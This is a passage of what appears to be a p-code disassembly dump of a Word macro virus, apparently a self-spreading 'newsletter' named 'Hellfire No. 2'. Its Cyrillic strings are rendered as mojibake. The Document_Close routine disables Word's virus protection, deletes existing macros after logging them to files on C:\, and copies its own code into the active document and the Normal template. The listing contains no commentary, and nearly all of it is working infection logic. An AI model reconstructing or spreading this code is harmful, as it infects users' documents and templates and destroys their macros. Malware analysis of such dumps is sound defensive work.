' 	ArgsLd Artikel_B 0x0003 
' 	St vb 
' Line #111:
' 	Ld nt 
' 	Ld vb 
' 	LitDI2 0x0001 
' 	Add 
' 	ArgsLd Artikel_E 0x0002 
' 	St ve 
' Line #112:
' 	Ld Selection 
' 	ArgsMemCall TypeParagraph 0x0000 
' Line #113:
' 	Ld vb 
' 	LitDI2 0x0001 
' 	Ld nt 
' 	MemLd codemodule 
' 	ArgsMemLd lines 0x0002 
' 	LitDI2 0x000E 
' 	LitVarSpecial (True)
' 	Ld wdAlignParagraphLeft 
' 	LitR8 0x0000 0x0000 0x0000 0x3FF8 
' 	LitVarSpecial (True)
' 	ArgsCall Druck_0 0x0006 
' Line #114:
' 	StartForVariable 
' 	Ld v 
' 	EndForVariable 
' 	Ld vb 
' 	LitDI2 0x0001 
' 	Add 
' 	Ld ve 
' 	For 
' Line #115:
' 	Ld v 
' 	LitDI2 0x0001 
' 	Ld nt 
' 	MemLd codemodule 
' 	ArgsMemLd lines 0x0002 
' 	LitDI2 0x000E 
' 	LitVarSpecial (False)
' 	Ld wdAlignParagraphJustify 
' 	LitR8 0x0000 0x0000 0x0000 0x3FF8 
' 	LitVarSpecial (True)
' 	ArgsCall Druck_0 0x0006 
' Line #116:
' 	StartForVariable 
' 	Ld v 
' 	EndForVariable 
' 	NextVar 
' Line #117:
' 	StartForVariable 
' 	Ld art 
' 	EndForVariable 
' 	NextVar 
' Line #118:
' 	Ld nt 
' 	Ld ve 
' 	LitDI2 0x0007 
' 	ArgsLd Artikel_B 0x0003 
' 	St vb 
' Line #119:
' 	Ld nt 
' 	Ld vb 
' 	LitDI2 0x0001 
' 	Add 
' 	ArgsLd Artikel_E 0x0002 
' 	St ve 
' Line #120:
' 	Ld Selection 
' 	ArgsMemCall TypeParagraph 0x0000 
' Line #121:
' 	Ld vb 
' 	LitDI2 0x0001 
' 	Ld nt 
' 	MemLd codemodule 
' 	ArgsMemLd lines 0x0002 
' 	LitDI2 0x000E 
' 	LitVarSpecial (True)
' 	Ld wdAlignParagraphLeft 
' 	LitR8 0x0000 0x0000 0x0000 0x3FF8 
' 	LitVarSpecial (True)
' 	ArgsCall Druck_0 0x0006 
' Line #122:
' 	Ld vb 
' 	LitDI2 0x0001 
' 	Add 
' 	LitDI2 0x0001 
' 	Ld nt 
' 	MemLd codemodule 
' 	ArgsMemLd lines 0x0002 
' 	LitDI2 0x000E 
' 	LitVarSpecial (False)
' 	Ld wdAlignParagraphJustify 
' 	LitR8 0x0000 0x0000 0x0000 0x3FF8 
' 	LitVarSpecial (True)
' 	ArgsCall Druck_0 0x0006 
' Line #123:
' 	Ld Selection 
' 	ArgsMemCall TypeParagraph 0x0000 
' Line #124:
' 	StartForVariable 
' 	Ld v 
' 	EndForVariable 
' 	Ld vb 
' 	LitDI2 0x0002 
' 	Add 
' 	Ld ve 
' 	For 
' Line #125:
' 	Ld v 
' 	LitDI2 0x0001 
' 	Ld nt 
' 	MemLd codemodule 
' 	ArgsMemLd lines 0x0002 
' 	LitDI2 0x000E 
' 	LitVarSpecial (True)
' 	Ld wdAlignParagraphRight 
' 	LitR8 0x0000 0x0000 0x0000 0x3FF8 
' 	LitVarSpecial (True)
' 	ArgsCall Druck_0 0x0006 
' Line #126:
' 	StartForVariable 
' 	Ld v 
' 	EndForVariable 
' 	NextVar 
' Line #127:
' 	Ld Selection 
' 	ArgsMemCall TypeParagraph 0x0000 
' Line #128:
' 	Ld Selection 
' 	ArgsMemCall TypeParagraph 0x0000 
' Line #129:
' 	StartForVariable 
' 	Ld art 
' 	EndForVariable 
' 	LitDI2 0x0008 
' 	LitDI2 0x000B 
' 	For 
' Line #130:
' 	Ld nt 
' 	Ld ve 
' 	Ld art 
' 	ArgsLd Artikel_B 0x0003 
' 	St vb 
' Line #131:
' 	Ld nt 
' 	Ld vb 
' 	LitDI2 0x0001 
' 	Add 
' 	ArgsLd Artikel_E 0x0002 
' 	St ve 
' Line #132:
' 	Ld Selection 
' 	ArgsMemCall TypeParagraph 0x0000 
' Line #133:
' 	Ld vb 
' 	LitDI2 0x0001 
' 	Ld nt 
' 	MemLd codemodule 
' 	ArgsMemLd lines 0x0002 
' 	LitDI2 0x0012 
' 	LitVarSpecial (True)
' 	Ld wdAlignParagraphCenter 
' 	LitDI2 0x0000 
' 	LitVarSpecial (True)
' 	ArgsCall Druck_0 0x0006 
' Line #134:
' 	Ld Selection 
' 	ArgsMemCall TypeParagraph 0x0000 
' Line #135:
' 	StartForVariable 
' 	Ld v 
' 	EndForVariable 
' 	Ld vb 
' 	LitDI2 0x0001 
' 	Add 
' 	Ld ve 
' 	LitDI2 0x0001 
' 	Sub 
' 	For 
' Line #136:
' 	Ld v 
' 	LitDI2 0x0001 
' 	Ld nt 
' 	MemLd codemodule 
' 	ArgsMemLd lines 0x0002 
' 	LitDI2 0x000E 
' 	LitVarSpecial (False)
' 	Ld wdAlignParagraphJustify 
' 	LitR8 0x0000 0x0000 0x0000 0x3FF8 
' 	LitVarSpecial (True)
' 	ArgsCall Druck_0 0x0006 
' Line #137:
' 	StartForVariable 
' 	Ld v 
' 	EndForVariable 
' 	NextVar 
' Line #138:
' 	Ld Selection 
' 	ArgsMemCall TypeParagraph 0x0000 
' Line #139:
' 	Ld ve 
' 	LitDI2 0x0001 
' 	Ld nt 
' 	MemLd codemodule 
' 	ArgsMemLd lines 0x0002 
' 	LitDI2 0x000E 
' 	LitVarSpecial (True)
' 	Ld wdAlignParagraphRight 
' 	LitDI2 0x0000 
' 	LitVarSpecial (True)
' 	ArgsCall Druck_0 0x0006 
' Line #140:
' 	Ld Selection 
' 	ArgsMemCall TypeParagraph 0x0000 
' Line #141:
' 	StartForVariable 
' 	Ld art 
' 	EndForVariable 
' 	NextVar 
' Line #142:
' 	Ld Selection 
' 	ArgsMemCall TypeParagraph 0x0000 
' Line #143:
' 	Ld nt 
' 	Ld ve 
' 	LitDI2 0x000C 
' 	ArgsLd Artikel_B 0x0003 
' 	St vb 
' Line #144:
' 	Ld nt 
' 	Ld vb 
' 	LitDI2 0x0001 
' 	Add 
' 	ArgsLd Artikel_E 0x0002 
' 	St ve 
' Line #145:
' 	Ld Selection 
' 	ArgsMemCall TypeParagraph 0x0000 
' Line #146:
' 	Ld vb 
' 	LitDI2 0x0001 
' 	Ld nt 
' 	MemLd codemodule 
' 	ArgsMemLd lines 0x0002 
' 	LitDI2 0x0012 
' 	LitVarSpecial (True)
' 	Ld wdAlignParagraphCenter 
' 	LitDI2 0x0000 
' 	LitVarSpecial (True)
' 	ArgsCall Druck_0 0x0006 
' Line #147:
' 	Ld Selection 
' 	ArgsMemCall TypeParagraph 0x0000 
' Line #148:
' 	Ld vb 
' 	LitDI2 0x0001 
' 	Add 
' 	LitDI2 0x0001 
' 	Ld nt 
' 	MemLd codemodule 
' 	ArgsMemLd lines 0x0002 
' 	LitDI2 0x000E 
' 	LitVarSpecial (False)
' 	Ld wdAlignParagraphJustify 
' 	LitR8 0x0000 0x0000 0x0000 0x3FF8 
' 	LitVarSpecial (True)
' 	ArgsCall Druck_0 0x0006 
' Line #149:
' 	Ld vb 
' 	LitDI2 0x0002 
' 	Add 
' 	LitDI2 0x0001 
' 	Ld nt 
' 	MemLd codemodule 
' 	ArgsMemLd lines 0x0002 
' 	LitDI2 0x000E 
' 	LitVarSpecial (False)
' 	Ld wdAlignParagraphJustify 
' 	LitDI2 0x0000 
' 	LitVarSpecial (False)
' 	ArgsCall Druck_0 0x0006 
' Line #150:
' 	Ld vb 
' 	LitDI2 0x0003 
' 	Add 
' 	LitDI2 0x0001 
' 	Ld nt 
' 	MemLd codemodule 
' 	ArgsMemLd lines 0x0002 
' 	LitDI2 0x000E 
' 	LitVarSpecial (False)
' 	Ld wdAlignParagraphJustify 
' 	LitR8 0x0000 0x0000 0x0000 0x3FF8 
' 	LitVarSpecial (True)
' 	ArgsCall Druck_0 0x0006 
' Line #151:
' 	Ld Selection 
' 	ArgsMemCall TypeParagraph 0x0000 
' Line #152:
' 	Ld vb 
' 	LitDI2 0x0004 
' 	Add 
' 	LitDI2 0x0001 
' 	Ld nt 
' 	MemLd codemodule 
' 	ArgsMemLd lines 0x0002 
' 	LitDI2 0x000E 
' 	LitVarSpecial (False)
' 	Ld wdAlignParagraphLeft 
' 	LitDI2 0x0000 
' 	LitVarSpecial (True)
' 	ArgsCall Druck_0 0x0006 
' Line #153:
' 	Ld Selection 
' 	ArgsMemCall TypeParagraph 0x0000 
' Line #154:
' 	Ld vb 
' 	LitDI2 0x0005 
' 	Add 
' 	LitDI2 0x0001 
' 	Ld nt 
' 	MemLd codemodule 
' 	ArgsMemLd lines 0x0002 
' 	LitDI2 0x000E 
' 	LitVarSpecial (False)
' 	Ld wdAlignParagraphJustify 
' 	LitR8 0x0000 0x0000 0x0000 0x3FF8 
' 	LitVarSpecial (True)
' 	ArgsCall Druck_0 0x0006 
' Line #155:
' 	Ld Selection 
' 	ArgsMemCall TypeParagraph 0x0000 
' Line #156:
' 	Ld ve 
' 	LitDI2 0x0001 
' 	Ld nt 
' 	MemLd codemodule 
' 	ArgsMemLd lines 0x0002 
' 	LitDI2 0x000E 
' 	LitVarSpecial (True)
' 	Ld wdAlignParagraphRight 
' 	LitDI2 0x0000 
' 	LitVarSpecial (True)
' 	ArgsCall Druck_0 0x0006 
' Line #157:
' 	Ld Selection 
' 	ArgsMemCall TypeParagraph 0x0000 
' Line #158:
' 	Ld Selection 
' 	ArgsMemCall TypeParagraph 0x0000 
' Line #159:
' 	Ld nt 
' 	Ld ve 
' 	LitDI2 0x000D 
' 	ArgsLd Artikel_B 0x0003 
' 	St vb 
' Line #160:
' 	Ld nt 
' 	Ld vb 
' 	LitDI2 0x0001 
' 	Add 
' 	ArgsLd Artikel_E 0x0002 
' 	St ve 
' Line #161:
' 	Ld Selection 
' 	ArgsMemCall TypeParagraph 0x0000 
' Line #162:
' 	Ld vb 
' 	LitDI2 0x0001 
' 	Ld nt 
' 	MemLd codemodule 
' 	ArgsMemLd lines 0x0002 
' 	LitDI2 0x0012 
' 	LitVarSpecial (True)
' 	Ld wdAlignParagraphCenter 
' 	LitDI2 0x0000 
' 	LitVarSpecial (True)
' 	ArgsCall Druck_0 0x0006 
' Line #163:
' 	Ld Selection 
' 	ArgsMemCall TypeParagraph 0x0000 
' Line #164:
' 	Ld vb 
' 	LitDI2 0x0001 
' 	Add 
' 	LitDI2 0x0001 
' 	Ld nt 
' 	MemLd codemodule 
' 	ArgsMemLd lines 0x0002 
' 	LitDI2 0x000E 
' 	LitVarSpecial (False)
' 	Ld wdAlignParagraphJustify 
' 	LitR8 0x0000 0x0000 0x0000 0x3FF8 
' 	LitVarSpecial (True)
' 	ArgsCall Druck_0 0x0006 
' Line #165:
' 	Ld vb 
' 	LitDI2 0x0002 
' 	Add 
' 	LitDI2 0x0001 
' 	Ld nt 
' 	MemLd codemodule 
' 	ArgsMemLd lines 0x0002 
' 	LitDI2 0x000E 
' 	LitVarSpecial (False)
' 	Ld wdAlignParagraphJustify 
' 	LitR8 0x0000 0x0000 0x0000 0x3FF8 
' 	LitVarSpecial (True)
' 	ArgsCall Druck_0 0x0006 
' Line #166:
' 	Ld Selection 
' 	ArgsMemCall TypeParagraph 0x0000 
' Line #167:
' 	Ld vb 
' 	LitDI2 0x0003 
' 	Add 
' 	LitDI2 0x0001 
' 	Ld nt 
' 	MemLd codemodule 
' 	ArgsMemLd lines 0x0002 
' 	LitDI2 0x000E 
' 	LitVarSpecial (True)
' 	Ld wdAlignParagraphRight 
' 	LitDI2 0x0000 
' 	LitVarSpecial (True)
' 	ArgsCall Druck_0 0x0006 
' Line #168:
' 	LitVarSpecial (False)
' 	St reg 
' Line #169:
' 	Ld Selection 
' 	ArgsMemCall TypeParagraph 0x0000 
' Line #170:
' 	LitStr 0x0025 "*************************************"
' 	LitDI2 0x000E 
' 	LitVarSpecial (False)
' 	Ld wdAlignParagraphCenter 
' 	LitDI2 0x0000 
' 	LitVarSpecial (True)
' 	ArgsCall Druck_0 0x0006 
' Line #171:
' 	LitStr 0x003D "Ó÷ðåäèòåëü - ñàòàíèíñêàÿ ñåêòà èìåíè Äæîíà Äè è Ýäâàðäà Êåëëè"
' 	LitDI2 0x000E 
' 	LitVarSpecial (False)
' 	Ld wdAlignParagraphCenter 
' 	LitDI2 0x0000 
' 	LitVarSpecial (True)
' 	ArgsCall Druck_0 0x0006 
' Line #172:
' 	LitStr 0x0021 "Ãëàâíûé ðåäàêòîð - Â. Ä. Òàðàñêèí"
' 	LitDI2 0x000E 
' 	LitVarSpecial (False)
' 	Ld wdAlignParagraphCenter 
' 	LitDI2 0x0000 
' 	LitVarSpecial (True)
' 	ArgsCall Druck_0 0x0006 
' Line #173:
' 	LitStr 0x0018 "Äèðåêòîð - Ã. Ñ. Ëèñóíîâ"
' 	LitDI2 0x000E 
' 	LitVarSpecial (False)
' 	Ld wdAlignParagraphCenter 
' 	LitDI2 0x0000 
' 	LitVarSpecial (True)
' 	ArgsCall Druck_0 0x0006 
' Line #174:
' 	LitStr 0x0019 "Àâòîð èäåè - À. Í. Ãåíîâà"
' 	LitDI2 0x000E 
' 	LitVarSpecial (False)
' 	Ld wdAlignParagraphCenter 
' 	LitDI2 0x0000 
' 	LitVarSpecial (True)
' 	ArgsCall Druck_0 0x0006 
' Line #175:
' 	LitStr 0x0032 "Êîíñóëüòàíò ïî âîïðîñàì âèðóñîëîãèè -  Ï. Â. Íîãèí"
' 	LitDI2 0x000E 
' 	LitVarSpecial (False)
' 	Ld wdAlignParagraphCenter 
' 	LitDI2 0x0000 
' 	LitVarSpecial (True)
' 	ArgsCall Druck_0 0x0006 
' Line #176:
' 	LitStr 0x0021 "Ãëàâíûé ïðîãðàììèñò - À. Â. Ðûæîâ"
' 	LitDI2 0x000E 
' 	LitVarSpecial (False)
' 	Ld wdAlignParagraphCenter 
' 	LitDI2 0x0000 
' 	LitVarSpecial (True)
' 	ArgsCall Druck_0 0x0006 
' Line #177:
' 	LitStr 0x002E "Êîìïüþòåðíûé íàáîð è îôîðìëåíèå - Ò. Â. Çóáîâà"
' 	LitDI2 0x000E 
' 	LitVarSpecial (False)
' 	Ld wdAlignParagraphCenter 
' 	LitDI2 0x0000 
' 	LitVarSpecial (True)
' 	ArgsCall Druck_0 0x0006 
' Line #178:
' 	LitStr 0x0019 "Êîððåêòîð - Â. Ô. Ôåäîðîâ"
' 	LitDI2 0x000E 
' 	LitVarSpecial (False)
' 	Ld wdAlignParagraphCenter 
' 	LitDI2 0x0000 
' 	LitVarSpecial (True)
' 	ArgsCall Druck_0 0x0006 
' Line #179:
' 	LitStr 0x0041 "Ìíåíèå ðåäàêöèè ìîæåò íå ñîâïàäàòü ñ ïîçèöèåé àâòîðîâ ïóáëèêàöèé."
' 	LitDI2 0x000E 
' 	LitVarSpecial (False)
' 	Ld wdAlignParagraphCenter 
' 	LitDI2 0x0000 
' 	LitVarSpecial (True)
' 	ArgsCall Druck_0 0x0006 
' Line #180:
' 	LitStr 0x004A "Ïðè ïåðåïå÷àòêå è èñïîëüçîâàíèè ìàòåðèàëîâ ññûëêà íà ãàçåòó íåîáÿçàòåëüíà."
' 	LitDI2 0x000E 
' 	LitVarSpecial (False)
' 	Ld wdAlignParagraphCenter 
' 	LitDI2 0x0000 
' 	LitVarSpecial (True)
' 	ArgsCall Druck_0 0x0006 
' Line #181:
' 	LitStr 0x0047 "Ðåäàêöèÿ íå íåñåò îòâåòñòâåííîñòè çà ñîäåðæàíèå ïóáëèêóåìûõ ìàòåðèàëîâ."
' 	LitDI2 0x000E 
' 	LitVarSpecial (False)
' 	Ld wdAlignParagraphCenter 
' 	LitDI2 0x0000 
' 	LitVarSpecial (True)
' 	ArgsCall Druck_0 0x0006 
' Line #182:
' 	LitStr 0x0010 "Àäñêèé îãîíü ¹ 2"
' 	ParamNamed FileName 
' 	Ld wdFormatRTF 
' 	ParamNamed FileFormat 
' 	LitVarSpecial (False)
' 	ParamNamed LockComments 
' 	LitStr 0x0000 ""
' 	ParamNamed Password 
' 	LitVarSpecial (True)
' 	ParamNamed AddToRecentFiles 
' 	LitStr 0x0000 ""
' 	ParamNamed WritePassword 
' 	LitVarSpecial (False)
' 	ParamNamed ReadOnlyRecommended 
' 	LitVarSpecial (False)
' 	ParamNamed EmbedTrueTypeFonts 
' 	LitVarSpecial (False)
' 	ParamNamed SaveNativePictureFormat 
' 	LitVarSpecial (False)
' 	ParamNamed SaveFormsData 
' 	LitVarSpecial (False)
' 	ParamNamed SaveAsAOCELetter 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x000B 
' Line #183:
' 	Ld ActiveDocument 
' 	ArgsMemCall Close 0x0000 
' Line #184:
' 	SetStmt 
' 	LitNothing 
' 	Set nt 
' Line #185:
' 	SetStmt 
' 	LitNothing 
' 	Set ad 
' Line #186:
' 	EndSub 
' Line #187:
' 	FuncDefn (Private Sub Document_Close())
' Line #188:
' 	Dim 
' 	VarDefn ad
' 	VarDefn nt (As Object)
' Line #189:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set nt 
' Line #190:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set ad 
' Line #191:
' 	OnError (Resume Next) 
' Line #192:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #193:
' 	Ld ad 
' 	ArgsLd Kontaminat 0x0001 
' 	Ld nt 
' 	ArgsLd Kontaminat 0x0001 
' 	Lt 
' 	Paren 
' 	Ld ActiveDocument 
' 	MemLd SaveFormat 
' 	Ld wdFormatDocument 
' 	Eq 
' 	Paren 
' 	Ld ActiveDocument 
' 	MemLd SaveFormat 
' 	Ld wdFormatTemplate 
' 	Eq 
' 	Paren 
' 	Or 
' 	Paren 
' 	And 
' 	IfBlock 
' 	QuoteRem 0x0094 0x001D "çàðàæåíèå àêòèâíîãî äîêóìåíòà"
' Line #194:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	St sd 
' Line #195:
' 	Ld ad 
' 	MemLd codemodule 
' 	MemLd countoflines 
' 	St cofl 
' Line #196:
' 	Ld cofl 
' 	LitDI2 0x0000 
' 	Gt 
' 	IfBlock 
' Line #197:
' 	LitStr 0x0003 "C:\"
' 	Ld ActiveDocument 
' 	MemLd ActiveWindow 
' 	MemLd Caption 
' 	Add 
' 	LitStr 0x0004 ".TXT"
' 	Add 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Append)
' Line #198:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x002F "Ìàêðîñû, áûâøèå â äîêóìåíòå äî âíåäðåíèÿ âèðóñà"
' 	PrintItemNL 
' Line #199:
' 	StartForVariable 
' 	Ld v 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld cofl 
' 	For 
' Line #200:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	Ld v 
' 	LitDI2 0x0001 
' 	Ld ad 
' 	MemLd codemodule 
' 	ArgsMemLd lines 0x0002 
' 	PrintItemNL 
' Line #201:
' 	StartForVariable 
' 	Ld v 
' 	EndForVariable 
' 	NextVar 
' Line #202:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #203:
' 	LitDI2 0x0001 
' 	Ld cofl 
' 	Ld ad 
' 	MemLd codemodule 
' 	ArgsMemCall deletelines 0x0002 
' Line #204:
' 	EndIfBlock 
' Line #205:
' 	StartForVariable 
' 	Ld v 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld nt 
' 	MemLd codemodule 
' 	MemLd countoflines 
' 	For 
' Line #206:
' 	Ld v 
' 	LitDI2 0x0001 
' 	Ld nt 
' 	MemLd codemodule 
' 	ArgsMemLd lines 0x0002 
' 	ArgsLd Trim 0x0001 
' 	LitStr 0x0000 ""
' 	Ne 
' 	IfBlock 
' Line #207:
' 	Ld v 
' 	Ld v 
' 	LitDI2 0x0001 
' 	Ld nt 
' 	MemLd codemodule 
' 	ArgsMemLd lines 0x0002 
' 	Ld ad 
' 	MemLd codemodule 
' 	ArgsMemCall insertlines 0x0002 
' Line #208:
' 	EndIfBlock 
' Line #209:
' 	StartForVariable 
' 	Ld v 
' 	EndForVariable 
' 	NextVar 
' Line #210:
' 	Ld sd 
' 	LitVarSpecial (True)
' 	Eq 
' 	Paren 
' 	Ld ActiveDocument 
' 	MemLd ActiveWindow 
' 	MemLd Caption 
' 	LitDI2 0x0001 
' 	LitDI2 0x0008 
' 	ArgsLd Mid$ 0x0003 
' 	LitStr 0x0008 "Äîêóìåíò"
' 	Ne 
' 	Paren 
' 	And 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #211:
' 	EndIfBlock 
' Line #212:
' 	Ld ad 
' 	ArgsLd Kontaminat 0x0001 
' 	Ld nt 
' 	ArgsLd Kontaminat 0x0001 
' 	Gt 
' 	IfBlock 
' 	QuoteRem 0x002B 0x0018 "çàðàæåíèå øàáëîíà Normal"
' Line #213:
' 	Ld NormalTemplate 
' 	MemLd Saved 
' 	St sd 
' Line #214:
' 	Ld nt 
' 	MemLd codemodule 
' 	MemLd countoflines 
' 	St cofl 
' Line #215:
' 	Ld cofl 
' 	LitDI2 0x0000 
' 	Gt 
' 	IfBlock 
' Line #216:
' 	LitStr 0x000D "C:\NORMAL.TXT"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Append)
' Line #217:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0024 "Ìàêðîñû, áûâøèå â øàáëîíå Normal.dot"
' 	PrintItemNL 
' Line #218:
' 	StartForVariable 
' 	Ld v 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld cofl 
' 	For 
' Line #219:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	Ld v 
' 	LitDI2 0x0001 
' 	Ld nt 
' 	MemLd codemodule 
' 	ArgsMemLd lines 0x0002 
' 	PrintItemNL 
' Line #220:
' 	StartForVariable 
' 	Ld v 
' 	EndForVariable 
' 	NextVar 
' Line #221:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #222:
' 	LitDI2 0x0001 
' 	Ld cofl 
' 	Ld nt 
' 	MemLd codemodule 
' 	ArgsMemCall deletelines 0x0002 
' Line #223:
' 	EndIfBlock 
' Line #224:
' 	StartForVariable 
' 	Ld v 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld ad 
' 	MemLd codemodule 
' 	MemLd countoflines 
' 	For 
' Line #225:
' 	Ld v 
' 	LitDI2 0x0001 
' 	Ld ad 
' 	MemLd codemodule 
' 	ArgsMemLd lines 0x0002 
' 	ArgsLd Trim 0x0001 
' 	LitStr 0x0000 ""
' 	Ne 
' 	IfBlock 
' Line #226:
' 	Ld v 
' 	Ld v 
' 	LitDI2 0x0001 
' 	Ld ad 
' 	MemLd codemodule 
' 	ArgsMemLd lines 0x0002 
' 	Ld nt 
' 	MemLd codemodule 
' 	ArgsMemCall insertlines 0x0002 
' Line #227:
' 	EndIfBlock 
' Line #228:
' 	StartForVariable 
' 	Ld v 
' 	EndForVariable 
' 	NextVar 
' Line #229:
' 	Ld sd 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #230:
' 	EndIfBlock 
' Line #231:
' 	SetStmt 
' 	LitNothing 
' 	Set nt 
' Line #232:
' 	SetStmt 
' 	LitNothing 
' 	Set ad 
' Line #233:
' 	EndSub 
' Line #234:
' 	FuncDefn (Private Sub Druck_0(T As String, Siz, Bld, Alg, Ind, Abz))
' Line #235:
' 	Ld Siz 
' 	Ld Selection 
' 	MemLd Font 
' 	MemSt Size 
' 	QuoteRem 0x001B 0x000D "ðàçìåð øðèôòà"
' Line #236:
' 	Ld Bld 
' 	Ld Selection 
' 	MemLd Font 
' 	MemSt Bold 
' 	QuoteRem 0x001B 0x0008 "æèðíîñòü"
' Line #237:
' 	Ld Alg 
' 	Ld Selection 
' 	MemLd ParagraphFormat 
' 	MemSt Alignment 
' 	QuoteRem 0x002B 0x000C "âûðàâíèâàíèå"
' Line #238:
' 	Ld Ind 
' 	ArgsLd CentimetersToPoints 0x0001 
' 	Ld Selection 
' 	MemLd ParagraphFormat 
' 	MemSt FirstLineIndent 
' 	QuoteRem 0x0046 0x0006 "îòñòóï"
' Line #239:
' 	Ld Abz 
' 	If 
' 	BoSImplicit 
' 	Ld Selection 
' 	ArgsMemCall TypeParagraph 0x0000 
' 	EndIf 
' Line #240:
' 	Ld reg 
' 	IfBlock 
' Line #241:
' 	Ld T 
' 	LitDI2 0x0002 
' 	Ld T 
' 	FnLen 
' 	LitDI2 0x0001 
' 	Sub 
' 	ArgsLd Mid$ 0x0003 
' 	ParamNamed Then 
' 	Ld Selection 
' 	ArgsMemCall TypeText 0x0001 
' Line #242:
' 	ElseBlock 
' Line #243:
' 	Ld T 
' 	ParamNamed Then 
' 	Ld Selection 
' 	ArgsMemCall TypeText 0x0001 
' Line #244:
' 	EndIfBlock 
' Line #245:
' 	EndSub 
' Line #246:
' 	FuncDefn (Private Function Artikel_B(O, start, num, id_FFFE As Variant))
' Line #247:
' 	Ld start 
' 	LitDI2 0x0001 
' 	Lt 
' 	Paren 
' 	Ld start 
' 	Ld O 
' 	MemLd codemodule 
' 	MemLd countoflines 
' 	Gt 
' 	Paren 
' 	Or 
' 	IfBlock 
' Line #248:
' 	LitDI2 0x0001 
' 	UMi 
' 	St Artikel_B 
' Line #249:
' 	ExitFunc 
' Line #250:
' 	EndIfBlock 
' Line #251:
' 	Ld start 
' 	LitDI2 0x0001 
' 	Ld O 
' 	MemLd codemodule 
' 	ArgsMemLd lines 0x0002 
' 	LitStr 0x0009 "'Articl #"
' 	Ld num 
' 	ArgsLd Trim 0x0001 
' 	Add 
' 	Ne 
' 	Paren 
' 	Ld start 
' 	Ld O 
' 	MemLd codemodule 
' 	MemLd countoflines 
' 	Le 
' 	Paren 
' 	And 
' 	While 
' Line #252:
' 	Ld start 
' 	LitDI2 0x0001 
' 	Add 
' 	St start 
' Line #253:
' 	Wend 
' Line #254:
' 	Ld start 
' 	LitDI2 0x0001 
' 	Add 
' 	St Artikel_B 
' Line #255:
' 	EndFunc 
' Line #256:
' 	FuncDefn (Private Function Artikel_E(O, start, id_FFFE As Variant))
' Line #257:
' 	Ld start 
' 	LitDI2 0x0001 
' 	Lt 
' 	Paren 
' 	Ld start 
' 	Ld O 
' 	MemLd codemodule 
' 	MemLd countoflines 
' 	Gt 
' 	Paren 
' 	Or 
' 	IfBlock 
' Line #258:
' 	LitDI2 0x0001 
' 	UMi 
' 	St Artikel_E 
' Line #259:
' 	ExitFunc 
' Line #260:
' 	EndIfBlock 
' Line #261:
' 	Ld start 
' 	LitDI2 0x0001 
' 	Ld O 
' 	MemLd codemodule 
' 	ArgsMemLd lines 0x0002 
' 	LitDI2 0x0001 
' 	LitDI2 0x0009 
' 	ArgsLd Mid$ 0x0003 
' 	LitStr 0x0009 "'Articl #"
' 	Ne 
' 	Paren 
' 	Ld start 
' 	Ld O 
' 	MemLd codemodule 
' 	MemLd countoflines 
' 	Le 
' 	Paren 
' 	And 
' 	While 
' Line #262:
' 	Ld start 
' 	LitDI2 0x0001 
' 	Add 
' 	St start 
' Line #263:
' 	Wend 
' Line #264:
' 	Ld start 
' 	Ld O 
' 	MemLd codemodule 
' 	MemLd countoflines 
' 	Gt 
' 	IfBlock 
' Line #265:
' 	Ld start 
' 	LitDI2 0x0001 
' 	Sub 
' 	St start 
' Line #266:
' 	EndIfBlock 
' Line #267:
' 	Ld start 
' 	LitDI2 0x0001 
' 	Sub 
' 	St Artikel_E 
' Line #268:
' 	EndFunc 
' Line #269:
' 	QuoteRem 0x0000 0x0009 "Articl #1"
' Line #270:
' 	QuoteRem 0x0000 0x002D "ÏÅÐÂÛÉ ÍÎÌÅÐ ÂÛØÅË Â ÑÂÅÒ. ÌÍÅÍÈß  ×ÈÒÀÒÅËÅÉ."
' Line #271:
' 	QuoteRem 0x0000 0x01AE "Âûõîä â ñâåò ïåðâîãî íîìåðà íàøåé ãàçåòû ñòàë íåîæèäàííîñòüþ äëÿ ìíîãèõ ëþäåé, èìåþùèõ äåëî ñ êîìïüþòåðàìè. Ìû ïîìåùàåì çäåñü íåáîëüøóþ ïîäáîðêó èíòåðâüþ, âçÿòûõ ó íåñêîëüêèõ ÷åëîâåê, âïåðâûå ïîçíàêîìèâøèõñÿ ñ "Àäñêèì îãíåì". Íàäååìñÿ, îíè äîñòàòî÷íî ïîëíî ïðåäñòàâëÿþò ñïåêòð ìíåíèé î íîâîé ãàçåòå. Ñëåäóåò îòìåòèòü, ÷òî íå âñå ëþäè ñîãëàøàëèñü íà èíòåðâüþ: ìíîãèå èñïûòûâàþò ñèëüíîå îòâðàùåíèå ê ñàòàíèñòàì è ñàòàíèíñêèì ñåêòàì."
' Line #272:
' 	QuoteRem 0x0000 0x0009 "Articl #2"
' Line #273:
' 	QuoteRem 0x0000 0x0032 "Ëèïàòîâà Í. Í., ïàòåíòîâåä èç "Àñòðàõàíüãàçïðîìà"."
' Line #274:
